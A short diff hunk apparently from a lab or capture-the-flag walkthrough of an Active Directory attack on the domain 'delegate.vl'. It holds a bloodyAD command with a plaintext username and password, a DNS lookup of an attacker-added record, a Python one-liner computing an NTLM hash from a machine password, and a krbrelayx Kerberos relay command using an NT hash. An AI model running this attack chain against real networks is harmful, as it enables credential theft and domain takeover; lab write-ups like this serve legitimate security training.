@@ -34,7 +34,7 @@ bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' ge
 
 dig pwn.delegate.vl @10.129.234.69
 
-python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","9k3VxHcDZZCRlE2zmqbhI1ntJPULRxyX".encode("utf16le")).digest()).decode())'
+python3 -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4','ijUf7IewMyXKjakwQxbtQmAqjrO4VW8S'.encode('utf-16-le')).digest()).decode())"
 
 python3 ./krbrelayx/krbrelayx.py -hashes :868cc835d19a9e9ffb7adbc0b2f6ef4f
 
